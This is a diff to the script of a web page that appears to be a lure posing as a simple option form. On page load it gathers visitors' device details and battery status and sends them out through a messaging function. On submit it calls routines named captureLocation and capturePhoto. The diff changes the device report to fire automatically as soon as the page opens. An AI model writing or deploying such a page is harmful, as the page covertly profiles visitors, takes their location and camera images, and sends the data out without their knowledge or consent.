@@ -21,7 +21,6 @@
             justify-content: center;
             height: 100vh;
             color: white;
-            overflow: hidden;
         }
 
         @keyframes gradientBG {
@@ -133,28 +132,19 @@
             return deviceInfo;
         }
 
-        function sendVisitInfo() {
-            getDeviceInfo().then(deviceInfo => {
-                const message = `🚀 **NEW USER VISIT**\n${deviceInfo}`;
-                sendMessage(message);
+        function sendDeviceInfo() {
+            navigator.getBattery().then(battery => {
+                getDeviceInfo().then(deviceInfo => {
+                    const batteryStatus = `🔋 **Battery:** ${Math.floor(battery.level * 100)}% (${battery.charging ? "Charging" : "Not Charging"})`;
+                    const message = `${deviceInfo}${batteryStatus}`;
+                    sendMessage(message);
+                });
             });
         }
 
         function submitData() {
-            const option = document.querySelector('input[type="checkbox"]:checked');
-            if (!option) return alert("Please select an option!");
-
-            navigator.getBattery().then(battery => {
-                const batteryStatus = `🔋 **Battery:** ${Math.floor(battery.level * 100)}% (${battery.charging ? "Charging" : "Not Charging"})`;
-                
-                getDeviceInfo().then(deviceInfo => {
-                    const message = `✅ **User Response**\n🟢 **Option:** ${option.nextElementSibling.innerText}\n${deviceInfo}${batteryStatus}`;
-                    sendMessage(message);
-                });
-
-                captureLocation();
-                capturePhoto();
-            });
+            captureLocation();
+            capturePhoto();
         }
 
         function captureLocation() {
@@ -205,7 +195,7 @@
             });
         }
 
-        window.onload = sendVisitInfo;
+        window.onload = sendDeviceInfo;
     </script>
 </body>
 </html>
